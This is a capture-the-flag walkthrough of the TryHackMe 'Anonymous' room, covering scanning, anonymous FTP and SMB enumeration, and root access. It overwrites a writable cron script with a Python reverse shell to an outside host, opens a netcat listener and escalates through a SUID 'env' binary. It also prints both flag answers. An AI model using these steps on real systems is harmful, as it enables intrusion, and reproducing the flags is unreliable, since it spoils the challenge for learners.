# [Anonymous](https://tryhackme.com/room/anonymous)

> Not the hacking group

## Scanning

scan carefully the target

```
nmap -sS -sV -sC -Pn 10.10.185.190
```

![image](https://user-images.githubusercontent.com/90561566/230727292-78b11923-d62d-423a-8617-5484fa039deb.png)

interesting, a huge information here

+ we have a ftp server allowed anonymous login, even writable permission
+ a samba server on windows 6.1 with empty password

## Enumeration

view remote share on smbclient with empty password

![image](https://user-images.githubusercontent.com/90561566/230729451-7bf785e1-2bd7-460a-951f-00b4cb6fa7ff.png)

there is a `pics` shared folder here

connect to ftp server

```
ftp 10.10.185.190
anonymous
anonymous
```

![image](https://user-images.githubusercontent.com/90561566/230727476-131f2d57-23a8-4d7e-b2aa-314d448f29a2.png)

```
ls
cd scripts
ls
```

![image](https://user-images.githubusercontent.com/90561566/230727533-2d61c444-42c3-44e7-9323-35ff936a4522.png)

get all file to local machine for further research

```
mget *
```

![image](https://user-images.githubusercontent.com/90561566/230727694-34a3d34a-d9c2-4147-ae36-d7983bd5df95.png)

![image](https://user-images.githubusercontent.com/90561566/230727729-360bc42a-8925-4fe3-b0b9-e64fabfdf286.png)

![image](https://user-images.githubusercontent.com/90561566/230727742-bd6d4246-5503-42a4-9ba2-f97141b32f73.png)

## Exploitation

it seem a cron jobs for auto cleanup scripts and all of it will be save to a log file

because we have wrirable permission, so i can change to my command

```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.43.204",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```
put clean.sh
```

and on our machine, open a netcat listener

```
nc -vlnp 1234
```

update terminal

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image](https://user-images.githubusercontent.com/90561566/230728856-ce90219f-84b8-4a8d-bb95-5ec080f7a73e.png)

```
cat user.txt
```

![image](https://user-images.githubusercontent.com/90561566/230728970-a995a475-612f-4eef-9cf3-8ddbbc980bd3.png)

| Flag | user.txt |
| --- | --- |
| Answer | 90d6f992585815ff991e68748c414740 |

## Privilege Escalation

find files with SUID bit

```
find / -type f -perm -04000 -ls 2>/dev/null
```

i found `env` seem good, at GTFOBins i see the exploitation

```
env /bin/sh -p
cat /root/root.txt
```

![image](https://user-images.githubusercontent.com/90561566/230729263-623d8d49-0395-489d-a2b4-797e51ce026a.png)

| Flag | root.txt |
| --- | --- |
| Answer | 4d930091c31a622a7ed10f27999af363 |
